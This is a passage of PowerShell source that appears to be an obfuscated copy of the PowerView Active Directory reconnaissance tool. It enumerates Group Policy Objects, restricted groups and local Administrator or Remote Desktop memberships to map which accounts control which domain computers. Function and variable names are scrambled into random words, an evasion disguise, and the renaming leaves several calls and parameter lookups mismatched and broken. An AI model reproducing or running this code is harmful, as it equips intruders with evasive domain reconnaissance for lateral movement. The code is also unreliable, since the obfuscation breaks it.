                    $EtwRUEzf99 = (benevolences -BoyAErDp99 $NkPRaTXB99).SiteName
                    if($EtwRUEzf99 -and ($EtwRUEzf99 -notlike 'Error*')) {
                        $cODXoeui99['Identity'] = $EtwRUEzf99
                        $OMsgkxNy99 += linguists @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }
                $prrbnSqM99 = $MSCuKRTY99.SubString($MSCuKRTY99.IndexOf('DC='))
                $cODXoeui99.Remove('Identity')
                $cODXoeui99.Remove('Properties')
                $cODXoeui99['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$prrbnSqM99)"
                $OMsgkxNy99 += structuring @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[outskirts] GPOAdsPaths: $OMsgkxNy99"
                if ($UZhUERNR99) { $cODXoeui99['Properties'] = $UZhUERNR99 }
                else { $cODXoeui99.Remove('Properties') }
                $cODXoeui99.Remove('Identity')
                $OMsgkxNy99 | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    $cODXoeui99['SearchBase'] = $_
                    $cODXoeui99['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    structuring @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $gkqsWVjp99 = ''
                $ypcTqVPU99 = ''
                $FMEdvzGY99 | Where-Object {$_} | ForEach-Object {
                    $nwpngcEV99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($nwpngcEV99 -match 'LDAP://|^CN=.*') {
                        $gkqsWVjp99 += "(distinguishedname=$nwpngcEV99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $WbECQjVp99 = $nwpngcEV99.SubString($nwpngcEV99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[outskirts] Extracted domain '$WbECQjVp99' from '$nwpngcEV99'"
                            $cODXoeui99['Domain'] = $WbECQjVp99
                            $qEoKaesE99 = Zimbabweans @SearcherArguments
                            if (-not $qEoKaesE99) {
                                Write-Warning "[outskirts] Unable to retrieve domain searcher for '$WbECQjVp99'"
                            }
                        }
                    }
                    elseif ($nwpngcEV99 -match '{.*}') {
                        $gkqsWVjp99 += "(name=$nwpngcEV99)"
                    }
                    else {
                        try {
                            $wqHaFAge99 = (-Join (([Guid]$nwpngcEV99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $gkqsWVjp99 += "(objectguid=$wqHaFAge99)"
                        }
                        catch {
                            $gkqsWVjp99 += "(displayname=$nwpngcEV99)"
                        }
                    }
                }
                if ($gkqsWVjp99 -and ($gkqsWVjp99.Trim() -ne '') ) {
                    $ypcTqVPU99 += "(|$gkqsWVjp99)"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[outskirts] Using additional LDAP filter: $YcLdsqIq99"
                    $ypcTqVPU99 += "$YcLdsqIq99"
                }
                $qEoKaesE99.filter = "(&(objectCategory=groupPolicyContainer)$ypcTqVPU99)"
                Write-Verbose "[outskirts] filter string: $($qEoKaesE99.filter)"
                if ($PSBoundParameters['FindOne']) { $oboKDFwv99 = $qEoKaesE99.FindOne() }
                else { $oboKDFwv99 = $qEoKaesE99.FindAll() }
                $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($sVFAWYQs99 -Match '^GC://')) {
                            $GPO = proletarian -pwEfoKvn99 $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $lHVLGqYI99 = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $tkCfYXMO99 = "\\$lHVLGqYI99\SysVol\$lHVLGqYI99\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $tkCfYXMO99
                            }
                            catch {
                                Write-Verbose "[outskirts] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = proletarian -pwEfoKvn99 $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($oboKDFwv99) {
                    try { $oboKDFwv99.dispose() }
                    catch {
                        Write-Verbose "[outskirts] Error disposing of the Results object: $_"
                    }
                }
                $qEoKaesE99.dispose()
            }
        }
    }
}
function products {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $FMEdvzGY99,
        [Switch]
        $EcSbbmtQ99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $cODXoeui99 = @{}
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['LDAPFilter']) { $cODXoeui99['LDAPFilter'] = $StsWGohF99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        $AcONhXjs99 = @{}
        if ($PSBoundParameters['Domain']) { $AcONhXjs99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Server']) { $AcONhXjs99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['Credential']) { $AcONhXjs99['Credential'] = $DegNROrc99 }
        $olFeGmXq99 = [System.StringSplitOptions]::RemoveEmptyEntries
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $cODXoeui99['Identity'] = $FMEdvzGY99 }
        outskirts @SearcherArguments | ForEach-Object {
            $ghfcjsan99 = $_.displayname
            $DiJmTVfg99 = $_.name
            $vAeSkmIW99 = $_.gpcfilesyspath
            $cxzUrQGY99 =  @{ 'GptTmplPath' = "$vAeSkmIW99\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $cxzUrQGY99['Credential'] = $DegNROrc99 }
            $Inf = fatally @ParseArgs
            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                $WOqkuQxF99 = @{}
                ForEach ($cfWdHbFk99 in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $TDlbboOg99 = $cfWdHbFk99.Key.Split('__', $olFeGmXq99) | ForEach-Object {$_.Trim()}
                    $hsiGUwhd99 = $cfWdHbFk99.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}
                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                        $klDUPPlq99 = @()
                        ForEach ($RLVMFVRY99 in $hsiGUwhd99) {
                            if ($RLVMFVRY99 -and ($RLVMFVRY99.Trim() -ne '')) {
                                if ($RLVMFVRY99 -notmatch '^S-1-.*') {
                                    $bLrjCYQv99 = @{'ObjectName' = $RLVMFVRY99}
                                    if ($PSBoundParameters['Domain']) { $bLrjCYQv99['Domain'] = $StsWGohF99 }
                                    $lQuocZUB99 = peter @ConvertToArguments
                                    if ($lQuocZUB99) {
                                        $klDUPPlq99 += $lQuocZUB99
                                    }
                                    else {
                                        $klDUPPlq99 += $RLVMFVRY99
                                    }
                                }
                                else {
                                    $klDUPPlq99 += $RLVMFVRY99
                                }
                            }
                        }
                        $hsiGUwhd99 = $klDUPPlq99
                    }
                    if (-not $WOqkuQxF99[$Group]) {
                        $WOqkuQxF99[$Group] = @{}
                    }
                    if ($hsiGUwhd99 -isnot [System.Array]) {$hsiGUwhd99 = @($hsiGUwhd99)}
                    $WOqkuQxF99[$Group].Add($TDlbboOg99, $hsiGUwhd99)
                }
                ForEach ($cfWdHbFk99 in $WOqkuQxF99.GetEnumerator()) {
                    if ($cfWdHbFk99 -and $cfWdHbFk99.Key -and ($cfWdHbFk99.Key -match '^\*')) {
                        $CogLiWqY99 = $cfWdHbFk99.Key.Trim('*')
                        if ($CogLiWqY99 -and ($CogLiWqY99.Trim() -ne '')) {
                            $nrOpsRrf99 = chews -ObjectSID $CogLiWqY99 @ConvertArguments
                        }
                        else {
                            $nrOpsRrf99 = $False
                        }
                    }
                    else {
                        $nrOpsRrf99 = $cfWdHbFk99.Key
                        if ($nrOpsRrf99 -and ($nrOpsRrf99.Trim() -ne '')) {
                            if ($nrOpsRrf99 -match 'Administrators') {
                                $CogLiWqY99 = 'S-1-5-32-544'
                            }
                            elseif ($nrOpsRrf99 -match 'Remote Desktop') {
                                $CogLiWqY99 = 'S-1-5-32-555'
                            }
                            elseif ($nrOpsRrf99 -match 'Guests') {
                                $CogLiWqY99 = 'S-1-5-32-546'
                            }
                            elseif ($nrOpsRrf99.Trim() -ne '') {
                                $bLrjCYQv99 = @{'ObjectName' = $nrOpsRrf99}
                                if ($PSBoundParameters['Domain']) { $bLrjCYQv99['Domain'] = $StsWGohF99 }
                                $CogLiWqY99 = peter @ConvertToArguments
                            }
                            else {
                                $CogLiWqY99 = $Null
                            }
                        }
                    }
                    $xiINMylF99 = New-Object PSObject
                    $xiINMylF99 | Add-Member Noteproperty 'GPODisplayName' $ghfcjsan99
                    $xiINMylF99 | Add-Member Noteproperty 'GPOName' $DiJmTVfg99
                    $xiINMylF99 | Add-Member Noteproperty 'GPOPath' $vAeSkmIW99
                    $xiINMylF99 | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $xiINMylF99 | Add-Member Noteproperty 'Filters' $Null
                    $xiINMylF99 | Add-Member Noteproperty 'GroupName' $nrOpsRrf99
                    $xiINMylF99 | Add-Member Noteproperty 'GroupSID' $CogLiWqY99
                    $xiINMylF99 | Add-Member Noteproperty 'GroupMemberOf' $cfWdHbFk99.Value.Memberof
                    $xiINMylF99 | Add-Member Noteproperty 'GroupMembers' $cfWdHbFk99.Value.Members
                    $xiINMylF99.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $xiINMylF99
                }
            }
            $cxzUrQGY99 =  @{
                'GroupsXMLpath' = "$vAeSkmIW99\MACHINE\Preferences\Groups\Groups.xml"
            }
            coherently @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $klDUPPlq99 = @()
                    ForEach ($RLVMFVRY99 in $_.GroupMembers) {
                        if ($RLVMFVRY99 -and ($RLVMFVRY99.Trim() -ne '')) {
                            if ($RLVMFVRY99 -notmatch '^S-1-.*') {
                                $bLrjCYQv99 = @{'ObjectName' = $nrOpsRrf99}
                                if ($PSBoundParameters['Domain']) { $bLrjCYQv99['Domain'] = $StsWGohF99 }
                                $lQuocZUB99 = peter -StsWGohF99 $StsWGohF99 -OFBZmnwK99 $RLVMFVRY99
                                if ($lQuocZUB99) {
                                    $klDUPPlq99 += $lQuocZUB99
                                }
                                else {
                                    $klDUPPlq99 += $RLVMFVRY99
                                }
                            }
                            else {
                                $klDUPPlq99 += $RLVMFVRY99
                            }
                        }
                    }
                    $_.GroupMembers = $klDUPPlq99
                }
                $_ | Add-Member Noteproperty 'GPODisplayName' $ghfcjsan99
                $_ | Add-Member Noteproperty 'GPOName' $DiJmTVfg99
                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}
function zebus {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $FMEdvzGY99,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $FGbmqQBB99 = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $HilcAiwI99 = @{}
        if ($PSBoundParameters['Domain']) { $HilcAiwI99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Server']) { $HilcAiwI99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $HilcAiwI99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $HilcAiwI99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $HilcAiwI99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $HilcAiwI99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $HilcAiwI99['Credential'] = $DegNROrc99 }
    }
    PROCESS {
        $DnKpbyfp99 = @()
        if ($PSBoundParameters['Identity']) {
            $DnKpbyfp99 += structuring @CommonArguments -FMEdvzGY99 $FMEdvzGY99 | Select-Object -Expand objectsid
            $RVndIyff99 = $DnKpbyfp99
            if (-not $DnKpbyfp99) {
                Throw "[zebus] Unable to retrieve SID for identity '$FMEdvzGY99'"
            }
        }
        else {
            $DnKpbyfp99 = @('*')
        }
        if ($FGbmqQBB99 -match 'S-1-5') {
            $EgpeDxRv99 = $FGbmqQBB99
        }
        elseif ($FGbmqQBB99 -match 'Admin') {
            $EgpeDxRv99 = 'S-1-5-32-544'
        }
        else {
            $EgpeDxRv99 = 'S-1-5-32-555'
        }
        if ($DnKpbyfp99[0] -ne '*') {
            ForEach ($vsPNMyyw99 in $DnKpbyfp99) {
                Write-Verbose "[zebus] Enumerating nested group memberships for: '$vsPNMyyw99'"
                $DnKpbyfp99 += ledger @CommonArguments -pwEfoKvn99 'objectsid' -RZXjsvAR99 $vsPNMyyw99 | Select-Object -ExpandProperty objectsid
            }
        }
        Write-Verbose "[zebus] Target localgroup SID: $EgpeDxRv99"
        Write-Verbose "[zebus] Effective target domain SIDs: $DnKpbyfp99"
        $SMPtmtGW99 = products @CommonArguments -EcSbbmtQ99 | ForEach-Object {
            $xiINMylF99 = $_
            if ($xiINMylF99.GroupSID -match $EgpeDxRv99) {
                $xiINMylF99.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($DnKpbyfp99[0] -eq '*') -or ($DnKpbyfp99 -Contains $_) ) {
                        $xiINMylF99
                    }
                }
            }
            if ( ($xiINMylF99.GroupMemberOf -contains $EgpeDxRv99) ) {
                if ( ($DnKpbyfp99[0] -eq '*') -or ($DnKpbyfp99 -Contains $xiINMylF99.GroupSID) ) {
                    $xiINMylF99
                }
            }
        } | Sort-Object -Property GPOName -Unique
        $SMPtmtGW99 | Where-Object {$_} | ForEach-Object {
            $DiJmTVfg99 = $_.GPODisplayName
            $VhGAgmVd99 = $_.GPOName
            $vAeSkmIW99 = $_.GPOPath
            $XmZvjWBF99 = $_.GPOType
            if ($_.GroupMembers) {
                $NnCgdVfI99 = $_.GroupMembers
            }
            else {
                $NnCgdVfI99 = $_.GroupSID
            }
            $VrOAjGLw99 = $_.Filters
            if ($DnKpbyfp99[0] -eq '*') {
                $YBxIfRso99 = $NnCgdVfI99
            }
            else {
                $YBxIfRso99 = $RVndIyff99
            }
            newspaperwomen @CommonArguments -Raw -pwEfoKvn99 'name,distinguishedname' -ISISqZtJ99 $VhGAgmVd99 | ForEach-Object {
                if ($VrOAjGLw99) {
                    $XfUlzdey99 = snivel @CommonArguments -pwEfoKvn99 'dnshostname,distinguishedname' -sVFAWYQs99 $_.Path | Where-Object {$_.distinguishedname -match ($VrOAjGLw99.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $XfUlzdey99 = snivel @CommonArguments -pwEfoKvn99 'dnshostname' -sVFAWYQs99 $_.Path | Select-Object -ExpandProperty dnshostname
                }
                if ($XfUlzdey99) {
                    if ($XfUlzdey99 -isnot [System.Array]) {$XfUlzdey99 = @($XfUlzdey99)}
                    ForEach ($vsPNMyyw99 in $YBxIfRso99) {
                        $Object = structuring @CommonArguments -FMEdvzGY99 $vsPNMyyw99 -pwEfoKvn99 'samaccounttype,samaccountname,distinguishedname,objectsid'
                        $INJqvJJU99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                        $HVZTvApE99 = New-Object PSObject
                        $HVZTvApE99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $HVZTvApE99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $HVZTvApE99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                        $HVZTvApE99 | Add-Member Noteproperty 'Domain' $StsWGohF99
                        $HVZTvApE99 | Add-Member Noteproperty 'IsGroup' $INJqvJJU99
                        $HVZTvApE99 | Add-Member Noteproperty 'GPODisplayName' $DiJmTVfg99
                        $HVZTvApE99 | Add-Member Noteproperty 'GPOGuid' $VhGAgmVd99
                        $HVZTvApE99 | Add-Member Noteproperty 'GPOPath' $vAeSkmIW99
                        $HVZTvApE99 | Add-Member Noteproperty 'GPOType' $XmZvjWBF99
                        $HVZTvApE99 | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
                        $HVZTvApE99 | Add-Member Noteproperty 'ComputerName' $XfUlzdey99
                        $HVZTvApE99.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $HVZTvApE99
                    }
                }
            }
            linguists @CommonArguments -pwEfoKvn99 'siteobjectbl,distinguishedname' -ISISqZtJ99 $VhGAgmVd99 | ForEach-Object {
                ForEach ($vsPNMyyw99 in $YBxIfRso99) {
                    $Object = structuring @CommonArguments -FMEdvzGY99 $vsPNMyyw99 -pwEfoKvn99 'samaccounttype,samaccountname,distinguishedname,objectsid'
                    $INJqvJJU99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                    $HVZTvApE99 = New-Object PSObject
                    $HVZTvApE99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $HVZTvApE99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $HVZTvApE99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $HVZTvApE99 | Add-Member Noteproperty 'IsGroup' $INJqvJJU99
                    $HVZTvApE99 | Add-Member Noteproperty 'Domain' $StsWGohF99
                    $HVZTvApE99 | Add-Member Noteproperty 'GPODisplayName' $DiJmTVfg99
                    $HVZTvApE99 | Add-Member Noteproperty 'GPOGuid' $VhGAgmVd99
                    $HVZTvApE99 | Add-Member Noteproperty 'GPOPath' $vAeSkmIW99
                    $HVZTvApE99 | Add-Member Noteproperty 'GPOType' $XmZvjWBF99
                    $HVZTvApE99 | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $HVZTvApE99 | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $HVZTvApE99.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $HVZTvApE99
                }
            }
        }
    }
}
function importer {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $hctnvgyd99,
        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $pUdAfwCJ99,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $FGbmqQBB99 = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $HilcAiwI99 = @{}
        if ($PSBoundParameters['Domain']) { $HilcAiwI99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Server']) { $HilcAiwI99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $HilcAiwI99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $HilcAiwI99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $HilcAiwI99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $HilcAiwI99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $HilcAiwI99['Credential'] = $DegNROrc99 }
    }
    PROCESS {
        if ($PSBoundParameters['ComputerIdentity']) {
            $MxbXNNBu99 = snivel @CommonArguments -FMEdvzGY99 $hctnvgyd99 -pwEfoKvn99 'distinguishedname,dnshostname'
            if (-not $MxbXNNBu99) {
                throw "[importer] Computer $hctnvgyd99 not found. Try a fully qualified host name."
            }
            ForEach ($YaYHUvEO99 in $MxbXNNBu99) {
                $jcosjnyP99 = @()
                $DN = $YaYHUvEO99.distinguishedname
                $UZrDKhqS99 = $DN.IndexOf('OU=')
                if ($UZrDKhqS99 -gt 0) {
                    $zaBJKepf99 = $DN.SubString($UZrDKhqS99)
                }
                if ($zaBJKepf99) {
                    $jcosjnyP99 += newspaperwomen @CommonArguments -sVFAWYQs99 $zaBJKepf99 -YcLdsqIq99 '(gplink=*)' | ForEach-Object {
                        Select-String -miMAbRWZ99 $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                Write-Verbose "Enumerating the sitename for: $($YaYHUvEO99.dnshostname)"
                $EtwRUEzf99 = (benevolences -BoyAErDp99 $YaYHUvEO99.dnshostname).SiteName
                if ($EtwRUEzf99 -and ($EtwRUEzf99 -notmatch 'Error')) {
                    $jcosjnyP99 += linguists @CommonArguments -FMEdvzGY99 $EtwRUEzf99 -YcLdsqIq99 '(gplink=*)' | ForEach-Object {
                        Select-String -miMAbRWZ99 $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                $jcosjnyP99 | products @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $xiINMylF99 = $_
                    if($xiINMylF99.GroupMembers) {
                        $NnCgdVfI99 = $xiINMylF99.GroupMembers
                    }
                    else {
                        $NnCgdVfI99 = $xiINMylF99.GroupSID
                    }
                    $NnCgdVfI99 | ForEach-Object {
                        $Object = structuring @CommonArguments -FMEdvzGY99 $_
                        $INJqvJJU99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                        $eJEeHekQ99 = New-Object PSObject
                        $eJEeHekQ99 | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99.dnshostname
                        $eJEeHekQ99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $eJEeHekQ99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $eJEeHekQ99 | Add-Member Noteproperty 'ObjectSID' $_
                        $eJEeHekQ99 | Add-Member Noteproperty 'IsGroup' $INJqvJJU99
                        $eJEeHekQ99 | Add-Member Noteproperty 'GPODisplayName' $xiINMylF99.GPODisplayName
                        $eJEeHekQ99 | Add-Member Noteproperty 'GPOGuid' $xiINMylF99.GPOName
                        $eJEeHekQ99 | Add-Member Noteproperty 'GPOPath' $xiINMylF99.GPOPath
                        $eJEeHekQ99 | Add-Member Noteproperty 'GPOType' $xiINMylF99.GPOType
                        $eJEeHekQ99.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $eJEeHekQ99
                    }
                }
            }
        }
    }
}
function slosh {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $JZQkMLhU99 = 'Domain',
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $cODXoeui99 = @{}
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        $AcONhXjs99 = @{}
        if ($PSBoundParameters['Server']) { $AcONhXjs99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['Credential']) { $AcONhXjs99['Credential'] = $DegNROrc99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $cODXoeui99['Domain'] = $StsWGohF99
            $AcONhXjs99['Domain'] = $StsWGohF99
        }
        if ($JZQkMLhU99 -eq 'All') {
            $cODXoeui99['Identity'] = '*'
        }
        elseif ($JZQkMLhU99 -eq 'Domain') {
            $cODXoeui99['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($JZQkMLhU99 -eq 'DomainController') -or ($JZQkMLhU99 -eq 'DC')) {
            $cODXoeui99['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $cODXoeui99['Identity'] = $JZQkMLhU99
        }
        $fPvDSqYK99 = outskirts @SearcherArguments
        ForEach ($GPO in $fPvDSqYK99) {
            $evOatchi99 = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
            $cxzUrQGY99 =  @{
                'GptTmplPath' = $evOatchi99
                'OutputObject' = $True
            }
            if ($PSBoundParameters['Credential']) { $cxzUrQGY99['Credential'] = $DegNROrc99 }
            fatally @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                $_
            }
        }
    }
}
function bucksaws {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
